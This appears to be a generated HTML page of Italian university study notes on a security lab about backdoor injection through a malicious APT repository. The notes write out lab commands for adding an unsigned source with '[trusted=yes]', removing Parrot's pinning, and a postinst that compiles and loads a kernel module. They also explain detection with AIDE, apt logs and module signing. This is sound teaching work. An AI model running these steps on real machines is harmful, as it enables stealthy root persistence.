@@ -1,0 +1,200 @@
+<!doctype html>
+<html lang="it" data-tema="scuro">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>appunti_moduloS7_backdoor_injection.md · cockpit</title>
+<link rel="stylesheet" href="../assets/app.css">
+</head>
+<body>
+<a class="salta" href="#contenuto">Vai al contenuto</a>
+
+<header class="testata">
+  <a class="marchio" href="../index.html">cockpit</a>
+  <nav class="navigazione">
+    <a href="../index.html">Oggi</a>
+    <a href="../laurea.html">Laurea</a>
+    <a href="../corsi.html">Corsi</a>
+    <a href="../materiali.html" aria-current="page">Materiali</a>
+    <a href="../workflow.html">Workflow</a>
+    <a href="../diario.html">Diario</a>
+  </nav>
+  <div class="azioni">
+    <button type="button" class="cerca-apri" data-apri-ricerca>
+      <span>Cerca</span><kbd>Ctrl</kbd><kbd>K</kbd>
+    </button>
+    <button type="button" class="tema" data-cambia-tema aria-label="Cambia tema"></button>
+  </div>
+</header>
+
+<main id="contenuto" class="contenuto">
+<p class="metrica__etichetta">
+  appunti</p>
+<h1 class="titolo-pagina">appunti_moduloS7_backdoor_injection.md</h1>
+<p class="tenue"><a href="../../Vault/UniCode/claudeAppunti/APPUNTI SECURITY/appunti_moduloS7_backdoor_injection.md">Apri il file originale</a></p>
+<article class="prosa"><h1 id="appunti-modulo-s7-lab-backdoor-injection">Appunti — Modulo S7: LAB Backdoor injection</h1>
+<p><strong>Corso</strong>: Lab Sicurezza Informatica T
+<strong>Lezione di riferimento</strong>: <code>lezione_moduloS7_backdoor_injection.md</code>
+<strong>Fonte lab</strong>: <code>SLIDE LAB/SICINF/LAB_Backdoor_injection_15apr.html</code>
+<strong>Stato</strong>: modulo mai studiato prima — nessun appunto grezzo di Lorenzo. Questi appunti simulano la lettura critica ("il <em>perché</em>, non la memorizzazione"; caccia attiva alle distinzioni simili-ma-diverse) in vista del quiz teorico che copre tutto il programma, comandi di lab inclusi.</p>
+<blockquote>
+<p>⚠️ Nessun appunto grezzo esistente per questo modulo: le domande sotto sono ricostruite dal profilo di studio (quelle che Lorenzo porrebbe leggendo la fonte). Il lab <strong>non è stato eseguito su VM</strong> — qui si consolida la comprensione teorica dei meccanismi, non un'esecuzione pratica.</p>
+</blockquote>
+<hr />
+<h2 id="lidea-di-fondo-lupdate-come-vettore">L'idea di fondo: l'update come vettore</h2>
+<p>L'attacco non "buca" il sistema: <strong>avvelena il canale di aggiornamento</strong>, di cui il sistema si fida per definizione. Chi controlla un pacchetto ottiene esecuzione come root, perché installare un pacchetto significa (anche) eseguire i suoi script come root.</p>
+<blockquote>
+<p><strong>Domanda</strong>: ma quindi l'attaccante deve già essere root per scrivere <code>evil.list</code> in <code>/etc/apt/sources.list.d/</code>? Se è già root, che senso ha "attaccare"?
+<strong>Risposta</strong>: sì, per <em>questo esercizio didattico</em> si parte lavorando come <code>root</code> sulla VM — è un banco di prova per <em>capire il meccanismo</em>, non una compromissione da zero. Nella realtà la scrittura della sorgente malevola arriva a monte: uno script di installazione che l'utente lancia con <code>sudo</code>, un pacchetto di terze parti che aggiunge il suo repo, una compromissione parziale che vuole <em>consolidarsi</em>. Il valore dell'attacco è il <strong>salto di profondità</strong>: da un accesso qualsiasi a una <strong>persistenza a livello kernel</strong>, invisibile e resistente. Il modulo insegna cosa succede <em>dopo</em> che si è messo piede nel canale, non come ci si entra.</p>
+</blockquote>
+<hr />
+<h2 id="tappa-1-il-repository-malevolo-e-i-due-controlli-di-apt">Tappa 1 — Il repository malevolo e i due controlli di APT</h2>
+<p>Riga aggiunta in <code>/etc/apt/sources.list.d/evil.list</code>:</p>
+<pre><code>deb [trusted=yes] http://darma.ing.unibo.it/debian-repo ./
+</code></pre>
+<p>Poi si sposta via il pinning di Parrot e si aggiornano gli indici:</p>
+<pre><code class="language-bash">mv /etc/apt/preferences.d/parrot-pinning /root
+apt update
+</code></pre>
+<blockquote>
+<p><strong>Domanda</strong>: <code>[trusted=yes]</code> e lo spostamento del <code>parrot-pinning</code> mi sembrano "due modi di dire ad APT: fidati". Fanno la stessa cosa?
+<strong>Risposta</strong>: no, ed è <strong>la</strong> distinzione da non sbagliare al quiz. Sono due controlli <strong>ortogonali</strong> di APT:
+- <code>[trusted=yes]</code> agisce sull'<strong>autenticazione</strong>: normalmente APT pretende che il repo sia firmato GPG (file <code>Release</code>/<code>InRelease</code> firmato con una chiave nota) e rifiuta i pacchetti se la firma non torna. <code>[trusted=yes]</code> disattiva <em>questo controllo</em> — "accetta anche se non firmato".
+- Il <strong>pinning</strong> (i file in <code>/etc/apt/preferences.d/</code>) agisce sulla <strong>priorità</strong>: a parità di pacchetto disponibile in più repo, decide <em>quale sorgente/versione</em> preferire. Parrot dà priorità più alta ai suoi repo; togliendo quel file, tutte le sorgenti tornano a priorità 500 e vince chi ha la versione più alta.
+Sintesi mnemonica: <strong>firma = "SE posso prendere questo pacchetto"; pinning = "QUALE pacchetto scelgo tra quelli ammissibili"</strong>. L'attacco deve battere entrambi: <code>[trusted=yes]</code> per la firma, <code>mv</code> del pinning per la priorità.</p>
+<p><strong>Domanda</strong>: cosa vuol dire <code>[trusted=yes]</code> "in chiaro"? È come <code>sudo</code> per apt?
+<strong>Risposta</strong>: no. Non aumenta i privilegi (apt gira già come root); <strong>abbassa la barra di verifica</strong>. Senza quel flag, APT scaricando dal repo non firmato direbbe qualcosa come "il repository non è firmato / autenticazione fallita" e si fermerebbe o chiederebbe conferma. <code>[trusted=yes]</code> sopprime quel controllo. Nella pratica difensiva reale: le sorgenti serie si autenticano con <code>signed-by=/percorso/chiave.gpg</code>; <code>[trusted=yes]</code> sotto <code>sources.list.d/</code> è un <strong>indicatore di compromissione</strong> da cercare.</p>
+<p><strong>Domanda</strong>: perché il lab dice che il pinning "è una buona idea, ed eviterebbe l'infezione"? Se è una difesa, perché Parrot ce l'ha ma poi la togliamo?
+<strong>Risposta</strong>: proprio perché è una difesa <em>reale e attiva di serie</em>: costringe APT a preferire i repo ufficiali di Parrot anche di fronte a una versione più recente altrove. Il lab <strong>la deve disattivare a mano</strong> perché l'attacco possa funzionare — cioè dimostra che senza quella disattivazione l'infezione non passerebbe. È un modo per farti vedere <em>quale</em> protezione stai aggirando.</p>
+<p><strong>Domanda</strong>: <code>apt update</code> a questo punto installa la backdoor?
+<strong>Risposta</strong>: no. <code>apt update</code> scarica <strong>solo gli indici</strong> (la lista di "cosa è disponibile e in che versione") da tutte le sorgenti. Dopo, APT <em>sa</em> che dal repo malevolo esiste un <code>bash</code> più nuovo, ma non ha ancora toccato nulla sul sistema. Distinzione da tenere ferma:
+- <code>apt update</code> → aggiorna la <strong>lista</strong> dei pacchetti disponibili;
+- <code>apt upgrade</code> → <strong>installa</strong> tutti gli aggiornamenti disponibili;
+- <code>apt install &lt;pkg&gt;</code> → installa/aggiorna <strong>un</strong> pacchetto specifico.</p>
+</blockquote>
+<hr />
+<h2 id="tappa-2-il-trucco-della-versione">Tappa 2 — Il trucco della versione</h2>
+<p><code>apt install bash</code> scarica il pacchetto malevolo perché dichiara versione <strong>5.2.37-2+b9</strong> contro <strong>+b7 installata</strong> e <strong>+b8 ufficiale</strong>.</p>
+<blockquote>
+<p><strong>Domanda</strong>: cosa significano quei <code>+b7 / +b8 / +b9</code>? Sono versioni diverse di bash?
+<strong>Risposta</strong>: la versione "vera" di bash è la stessa (<code>5.2.37-2</code>); il suffisso <code>+bN</code> è il <strong>binary rebuild</strong> (una ricompilazione del <em>pacchetto</em> senza cambiare il sorgente). Ai fini della scelta conta solo l'ordinamento: <code>dpkg</code> confronta i numeri di versione e <code>+b9 &gt; +b8 &gt; +b7</code>. L'attaccante non ha inventato una versione nuova di bash: ha pubblicato un pacchetto con un numero <strong>appena più alto</strong> di quello ufficiale. Con pinning tolto e firma bypassata, "più alto" basta a farlo scegliere.</p>
+<p><strong>Domanda</strong>: il lab dice che il pacchetto è "aggiornato, non installato". Perché questa distinzione conta per l'attaccante?
+<strong>Risposta</strong>: perché la <strong>furtività</strong> cambia. <code>bash</code> è già presente su ogni sistema: quindi non compare un pacchetto <em>nuovo e sospetto</em>, compare un <em>aggiornamento</em> di un pacchetto core.
+- Con <code>apt upgrade</code>, questo update si sarebbe <strong>mescolato all'aggiornamento di ~180 altri pacchetti</strong> — invisibile nel mucchio.
+- Con gli <strong>aggiornamenti automatici</strong> (unattended-upgrades), sarebbe potuto avvenire <strong>in background</strong>, senza che nessuno lanci un comando.
+Per il difensore l'anomalia non è "un file strano" ma "<code>bash</code> aggiornato da una sorgente non ufficiale a una versione che l'upstream non ha mai rilasciato" — visibile in <code>apt-cache policy bash</code> e nei log <code>/var/log/apt/history.log</code>, <code>/var/log/dpkg.log</code>.</p>
+</blockquote>
+<hr />
+<h2 id="tappa-3-come-un-deb-esegue-codice">Tappa 3 — Come un <code>.deb</code> esegue codice</h2>
+<p>Il pacchetto, installandosi, esegue (come root, da solo):</p>
+<pre><code class="language-bash">cd /usr/share/badmodule
+make
+insmod ./root.ko
+</code></pre>
+<p>E dichiara <code>Depends: ... build-essential, linux-headers-amd64</code>.</p>
+<blockquote>
+<p><strong>Domanda</strong>: chi lancia quei tre comandi? Io ho scritto solo <code>apt install bash</code>.
+<strong>Risposta</strong>: li lancia <strong><code>dpkg</code>, automaticamente</strong>, tramite i <em>maintainer scripts</em> del pacchetto. Un <code>.deb</code> contiene due parti: i <strong>file da installare</strong> (il <em>data</em>) e le <strong>info di controllo</strong> (il <em>control</em>), tra cui script chiamati <code>preinst</code>, <code>postinst</code>, <code>prerm</code>, <code>postrm</code>. <code>dpkg</code> li esegue prima/dopo l'installazione o rimozione — <strong>come root</strong>. I tre comandi stanno nel <code>postinst</code>: eseguiti a fine installazione senza che tu li digiti. Questo è il meccanismo centrale del modulo.</p>
+<p><strong>Domanda</strong>: quindi non è un bug di apt? Sembra troppo facile.
+<strong>Risposta</strong>: esatto, <strong>non è un bug, è il design</strong>. I maintainer scripts servono a cose legittime e necessarie (creare utenti di sistema, avviare demoni, compilare moduli DKMS). L'esecuzione di codice root all'installazione è <em>prevista</em>. L'attacco sfrutta una funzionalità, non una vulnerabilità — ed è per questo che è così potente: cade l'idea che "un pacchetto è solo un insieme di file da copiare". Accettare un pacchetto = accettare di eseguirne gli script come root.</p>
+<p><strong>Domanda</strong>: cosa c'entrano <code>build-essential</code> e <code>linux-headers-amd64</code>? bash non ha bisogno di un compilatore.
+<strong>Risposta</strong>: infatti <strong>non sono dipendenze vere di bash</strong> — servono al <em>payload</em>. <code>build-essential</code> porta <code>gcc</code>/<code>make</code>, <code>linux-headers-amd64</code> porta gli header del kernel. Servono perché il <code>postinst</code> <strong>compila</strong> (<code>make</code>) e <strong>carica</strong> (<code>insmod</code>) un modulo kernel, e per farlo servono compilatore e header del kernel in esecuzione. L'attaccante <strong>coopta il risolutore di dipendenze</strong> di APT: dichiarandole in <code>Depends</code>, se le fa installare <em>da APT stesso</em> in automatico. Rovescio della medaglia per il difensore: un "aggiornamento di bash" che tira dentro <code>build-essential</code> e <code>linux-headers</code> è palesemente incoerente → red flag.</p>
+<p><strong>Domanda</strong>: perché compilare il modulo <em>sul mio PC</em> invece di consegnarmelo già pronto nel pacchetto?
+<strong>Risposta</strong>: perché un modulo kernel deve corrispondere <strong>esattamente alla versione del kernel</strong> su cui viene caricato — un <code>.ko</code> precompilato per un altro kernel non si caricherebbe. Compilando <em>in loco</em> contro gli header locali (<code>linux-headers-amd64</code>), il modulo risulta compatibile su qualunque VM/kernel: l'attacco diventa <strong>portabile</strong> senza dover impacchettare un <code>.ko</code> per ogni possibile kernel.</p>
+</blockquote>
+<hr />
+<h2 id="tappa-4-la-backdoor-e-un-modulo-kernel-lkm">Tappa 4 — La backdoor è un modulo kernel (LKM)</h2>
+<p>Payload lasciato in <code>/usr/share/badmodule/</code>; il modulo compilato è <code>root.ko</code>, caricato con <code>insmod</code>.</p>
+<blockquote>
+<p><strong>Domanda</strong>: cos'è un "modulo kernel" e perché è più grave di un normale programma malevolo?
+<strong>Risposta</strong>: un <strong>LKM (Loadable Kernel Module)</strong> è codice caricato <strong>dentro il kernel a runtime</strong> (senza riavvio) ed eseguito in <strong>ring 0</strong>, lo stesso livello di privilegio del kernel. La differenza con una backdoor <em>userspace</em> (un processo, un cron, una shell nascosta):
+- una backdoor userspace vive <em>sopra</em> il kernel → la vedi e la uccidi con <code>ps</code>, <code>kill</code>, ecc.;
+- una backdoor <strong>kernel</strong> vive <em>dentro</em> l'osservatore → può intercettare le system call (hooking) e <strong>nascondere sé stessa</strong> da <code>lsmod</code>, nascondere processi da <code>ps</code>, file da <code>ls</code>, connessioni da <code>ss</code>. È il codice stesso a rispondere alle domande degli strumenti di ispezione.
+È la base dei <strong>rootkit kernel</strong>: privilegio massimo + persistenza + invisibilità.</p>
+<p><strong>Domanda</strong>: i comandi da ricordare per i moduli quali sono?
+<strong>Risposta</strong>: <code>insmod ./root.ko</code> carica un modulo dal file indicato; <code>lsmod</code> (o <code>cat /proc/modules</code>) li elenca; <code>rmmod</code> li rimuove; <code>make</code> + <code>linux-headers</code> + <code>build-essential</code> è la toolchain per produrre il <code>.ko</code>. Nota: <code>insmod</code> prende un <strong>file preciso</strong>; il "fratello maggiore" <code>modprobe</code> risolve invece nomi e dipendenze dei moduli dai percorsi standard — nel lab si usa <code>insmod</code> perché il <code>.ko</code> è appena compilato lì, in una cartella non standard.</p>
+</blockquote>
+<hr />
+<h2 id="tappa-5-secure-boot-e-firma-dei-moduli">Tappa 5 — Secure Boot e firma dei moduli</h2>
+<p>Il lab: l'iniezione riesce perché <strong>Parrot parte senza Secure Boot</strong>, quindi carica moduli anche non autenticati; su un sistema con Secure Boot (es. Ubuntu) la injection ha successo ma <strong>il modulo non viene caricato</strong>.</p>
+<blockquote>
+<p><strong>Domanda</strong>: "Secure Boot" e "firma dei moduli" sono la stessa cosa? Il lab li nomina insieme.
+<strong>Risposta</strong>: sono <strong>collegati ma distinti</strong> — altra distinzione da presidiare:
+- <strong>Secure Boot</strong> (UEFI): il <em>firmware</em> verifica la firma di ogni anello della catena d'avvio (bootloader → kernel), così parte solo <em>un kernel autentico</em>.
+- <strong>Firma dei moduli</strong> (module signing): quando Secure Boot è attivo, il <em>kernel</em> entra in <em>lockdown</em> e applica <code>module.sig_enforce</code>, <strong>rifiutando di caricare moduli non firmati</strong> con una chiave fidata (nel db UEFI o registrata come MOK, Machine Owner Key).
+Secure Boot protegge <em>l'avvio del kernel</em>; la firma dei moduli protegge <em>ciò che il kernel carica dopo</em>. Nel lab è il secondo a fermare l'attacco, ma è Secure Boot ad "accenderlo".</p>
+<p><strong>Domanda</strong>: quindi con Secure Boot l'<code>apt install</code> fallirebbe?
+<strong>Risposta</strong>: <strong>no, e questo è il punto più facile da sbagliare al quiz</strong>. L'<code>apt install</code> <strong>riesce</strong>, il <code>postinst</code> gira, <code>make</code> <strong>compila</strong> il modulo. È l'<strong>ultimo</strong> passo, <code>insmod ./root.ko</code>, a essere <strong>bloccato dal kernel</strong> perché il modulo non è firmato (errore tipo <code>Key was rejected by service</code>). La <em>software injection</em> ha successo; è il <em>caricamento del modulo</em> a fallire. La catena si spezza sull'<code>insmod</code>, non sull'<code>apt</code>.</p>
+<p><strong>Domanda</strong>: se Parrot non può fare Secure Boot, un difensore su Parrot è senza difese a questo strato?
+<strong>Risposta</strong>: non del tutto. Se manca Secure Boot restano contromisure equivalenti sul caricamento moduli: <code>sysctl kernel.modules_disabled=1</code> (dopo il boot, impedisce ogni ulteriore <code>insmod</code>/<code>modprobe</code>) o il kernel <em>lockdown</em>. Ma è vero che <em>nella configurazione del lab</em> quello strato manca ed è precisamente perché l'<code>insmod</code> riesce.</p>
+</blockquote>
+<hr />
+<h2 id="difesa-prevenzione-vs-rilevazione-e-una-trappola">Difesa: prevenzione vs rilevazione (e una trappola)</h2>
+<blockquote>
+<p><strong>Domanda</strong>: mettendo tutto insieme, come mi difendo — e come me ne accorgo <em>dopo</em>?
+<strong>Risposta</strong>:
+<strong>Prevenire</strong>: mai <code>[trusted=yes]</code> (usare <code>signed-by=</code> con chiavi note); mantenere il pinning e l'integrità di <code>/etc/apt/</code>; Secure Boot + <code>module.sig_enforce</code> o <code>kernel.modules_disabled=1</code>; niente autoupdate da sorgenti non verificate.
+<strong>Rilevare</strong>: <code>apt-cache policy bash</code> (da che repo arriva il candidato) e i log <code>/var/log/apt/history.log</code>, <code>/var/log/dpkg.log</code>; <strong>integrity check con baseline noto-buona</strong> (AIDE) su <code>/usr/bin</code>, <code>/usr/share</code>, <code>/lib/modules</code>.</p>
+<p><strong>Domanda</strong>: <code>debsums</code> e <code>AIDE</code> sono la stessa cosa? Entrambi controllano l'integrità dei file.
+<strong>Risposta</strong>: no, e la differenza è <strong>l'ancora di fiducia</strong> — distinzione sottile ma da quiz:
+- <code>debsums</code> verifica i file installati <strong>contro il manifest del pacchetto stesso</strong> (gli hash che il <code>.deb</code> dichiara). Il pacchetto malevolo è <em>coerente con il proprio manifest</em> → <code>debsums</code> <strong>non lo segnala</strong>.
+- <strong>AIDE</strong> confronta lo stato attuale contro un <strong>database baseline creato prima</strong> su sistema pulito (indipendente dai pacchetti). I file nuovi (<code>/usr/share/badmodule/</code>, <code>root.ko</code>) e il <code>bash</code> sostituito → <strong>rilevati</strong>.
+In una riga: <code>debsums</code> chiede "corrispondi a ciò che <em>tu</em> dichiari?", AIDE chiede "corrispondi a com'eri <em>prima</em>?". Contro un pacchetto malevolo coerente con sé stesso, solo la seconda domanda funziona. (È esattamente l'AIDE del lab S11.) Attenzione anche al fatto che, una volta caricato il modulo, <code>lsmod</code>/<code>ps</code> possono essere ingannati: la rilevazione affidabile è da baseline esterna/offline.</p>
+</blockquote>
+<hr />
+<h2 id="connessioni">Connessioni</h2>
+<blockquote>
+<p>⚠️ Sezione non presente in appunti grezzi (non esistono per questo modulo).</p>
+</blockquote>
+<ul>
+<li><strong>S11 — Integrity check e privilege escalation</strong> (svolto, lab <code>change1</code>…<code>change5</code>): collegamento diretto. In S11 la strategia difensiva era <strong>AIDE</strong>: database del sottoalbero <code>/usr/bin</code> sul sistema pulito → lancio del "malware" → confronto per rilevare la modifica (lì: bit <strong>SUID</strong> su <code>cp</code>). Identica difesa applicabile qui contro <code>apt install bash</code>. Sul lato offensivo, S11 e S7 sono due gradini della <strong>persistenza dell'attaccante</strong>: S11 resta in <strong>userspace</strong> (SUID su <code>cp</code>, poi utente <code>toor</code> uid 0 iniettato in <code>/etc/passwd</code>+<code>/etc/shadow</code>), S7 sale al <strong>kernel</strong> (LKM) — più profondo e più difficile da rilevare, perché può occultarsi agli stessi strumenti userspace usati in S11 per indagare.</li>
+<li><strong>S10 — Network Intrusion Detection</strong> (svolto, Wireshark + Suricata): (1) il pacchetto arriva via <strong><code>http://</code> in chiaro</strong> da un repo non ufficiale → un monitor di rete può segnalarlo; (2) una backdoor kernel apre tipicamente un canale C2/reverse shell → è il traffico anomalo che un NIDS rileva. Integrity check guarda il <strong>disco</strong>, NIDS guarda la <strong>rete</strong>.</li>
+<li><strong>S5 — Firewall (iptables/nftables)</strong>: un firewall d'uscita default-deny potrebbe bloccare sia il fetch dal repo malevolo sia il callback della backdoor. Firewall = prevenzione perimetrale; NIDS = rilevazione di rete; integrity check = rilevazione a terra.</li>
+</ul>
+<hr />
+<h2 id="domande-di-autoverifica-risposte">Domande di autoverifica — Risposte</h2>
+<blockquote>
+<p>⚠️ Sezione non presente in appunti grezzi. Risposte al quiz della lezione (<code>lezione_moduloS7_backdoor_injection.md</code>), da rifare a mente prima dell'esame.</p>
+</blockquote>
+<ol>
+<li><strong>Falso</strong> — <code>apt update</code> scarica solo gli indici; non installa.</li>
+<li><strong>Falso</strong> — <code>[trusted=yes]</code> <em>disabilita</em> la verifica della firma, non la rafforza.</li>
+<li><strong>Falso</strong> — il pinning riguarda la priorità/selezione della versione, non l'autenticazione (quella la bypassa <code>[trusted=yes]</code>).</li>
+<li><strong>(b)</strong> — versione più alta + pinning rimosso + firma bypassata.</li>
+<li><strong>Vero</strong> — via maintainer scripts (<code>postinst</code>) eseguiti da <code>dpkg</code> come root.</li>
+<li><strong>(b)</strong> — servono a compilare/caricare il modulo; APT le installa in automatico via <code>Depends</code>.</li>
+<li><strong>Vero</strong> — modulo in ring 0, può auto-occultarsi e nascondere processi/file/connessioni.</li>
+<li><strong>Falso</strong> — installazione e compilazione riescono; è l'<code>insmod</code> a essere bloccato dal kernel.</li>
+<li><strong>(b)</strong> — <code>debsums</code> verifica contro il manifest del pacchetto stesso, con cui il malware è coerente; serve una baseline indipendente (AIDE).</li>
+<li><strong>Vero</strong> — manca Secure Boot su Parrot, quindi manca la firma-enforcement dei moduli: <code>insmod</code> passa.</li>
+</ol>
+<hr />
+<h2 id="riepilogo">Riepilogo</h2>
+<blockquote>
+<p>⚠️ Sezione non presente in appunti grezzi.</p>
+</blockquote>
+<ul>
+<li>Attacco alla <strong>catena di fiducia del package manager</strong>: <code>[trusted=yes]</code> (firma) + rimozione pinning (priorità) + versione più alta → il pacchetto malevolo diventa "l'aggiornamento" di <code>bash</code>.</li>
+<li>Un <code>.deb</code> <strong>esegue codice come root</strong> all'installazione via maintainer scripts; le <code>Depends</code> (<code>build-essential</code>, <code>linux-headers</code>) si tirano dietro la toolchain per compilare/caricare un <strong>modulo kernel</strong> — persistenza in ring 0, invisibile.</li>
+<li>Difesa in profondità: repo firmati + pinning (ingresso), consapevolezza che installare = eseguire (esecuzione), <strong>firma dei moduli sotto Secure Boot</strong> (effetto finale, assente su Parrot).</li>
+<li>Rilevazione: baseline indipendente (<strong>AIDE</strong>, come S11), non <code>debsums</code>; provenienza via <code>apt-cache policy</code>; il NIDS (S10) intercetta il traffico della backdoor.</li>
+<li>Distinzioni chiave da non confondere al quiz: firma≠pinning; <code>apt update</code>≠<code>upgrade</code>≠<code>install</code>; Secure Boot≠firma dei moduli; l'<code>insmod</code> (non l'<code>apt install</code>) è ciò che Secure Boot blocca; <code>debsums</code>≠AIDE (manifest del pacchetto vs baseline noto-buona); backdoor userspace≠kernel.</li>
+</ul>
+<!-- AUTO-LINKS:START -->
+<!-- AUTO-LINKS:END --></article>
+</main>
+
+<footer class="pieDiPagina">
+  <p>Generato il 2026-09-02 16:48 da <code>scripts/build_ui.py</code>. Sola lettura.</p>
+</footer>
+
+<dialog class="ricerca" id="ricerca">
+  <input type="search" id="ricerca-campo" placeholder="Cerca in tutto il cockpit…" autocomplete="off">
+  <ul id="ricerca-esiti"></ul>
+</dialog>
+
+<script>window.RADICE = "../";</script>
+<script src="../assets/indice.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
